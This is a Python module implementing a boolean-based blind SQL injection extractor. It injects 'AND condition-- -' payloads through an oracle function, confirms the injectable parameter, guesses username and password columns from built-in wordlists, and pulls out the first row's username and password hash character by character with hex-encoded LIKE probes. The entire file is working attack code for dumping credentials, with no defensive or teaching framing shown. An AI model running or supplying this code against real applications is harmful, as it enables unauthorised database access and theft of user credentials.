from __future__ import annotations

from typing import Callable, Optional, Sequence

_HEX = "0123456789abcdef"
_PRINTABLE = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$^&*()-_+=.,:@/ "
_USER_COLS = ("user", "username", "login", "name", "email", "uname", "account")
_PASS_COLS = ("password", "pass", "pwd", "passwd", "secret", "hash", "token")

Oracle = Callable[[str], bool]


class BlindExtractor:
    def __init__(self, oracle: Oracle, quote: str = "", say: Optional[Callable[[str], None]] = None,
                 user_cols: Optional[Sequence[str]] = None,
                 pass_cols: Optional[Sequence[str]] = None,
                 like: Optional[str] = None):
        self.oracle = oracle
        self.q = quote
        self.say = say or (lambda _m: None)
        self.requests = 0
        self.user_cols = tuple(user_cols) if user_cols else _USER_COLS
        self.pass_cols = tuple(pass_cols) if pass_cols else _PASS_COLS
        self.like = like or "{col} LIKE {hex}"

    def _cond(self, condition: str) -> bool:
        self.requests += 1
        return self.oracle(f"1{self.q} AND {condition}-- -")

    def confirm(self) -> bool:
        return self._cond("1=1") and not self._cond("1=2")

    def column_exists(self, col: str) -> bool:
        return self._cond(self.like.format(col=col, hex="0x25"))

    def find_column(self, candidates) -> str:
        for c in candidates:
            if self.column_exists(c):
                return c
        return ""

    def extract(self, col: str, charset: str = _HEX, max_len: int = 64) -> str:
        value = ""
        while len(value) < max_len:
            found = None
            for ch in charset:
                like_hex = "0x" + (value + ch).encode("utf-8").hex() + "25"
                if self._cond(self.like.format(col=col, hex=like_hex)):
                    found = ch
                    break
            if found is None:
                break
            value += found
            self.say(f"[Blind] {col}: {value}")
        return value

    def dump_first_row(self) -> Optional[dict]:
        if not self.confirm():
            return None
        user_col = self.find_column(self.user_cols)
        pass_col = self.find_column(self.pass_cols)
        self.say(f"[Blind] columnas halladas: usuario={user_col!r} password={pass_col!r}")
        if not pass_col:
            return None
        username = self.extract(user_col, charset=_PRINTABLE) if user_col else ""
        password = self.extract(pass_col, charset=_HEX) or self.extract(pass_col, charset=_PRINTABLE)
        return {"username": username, "hash": password}
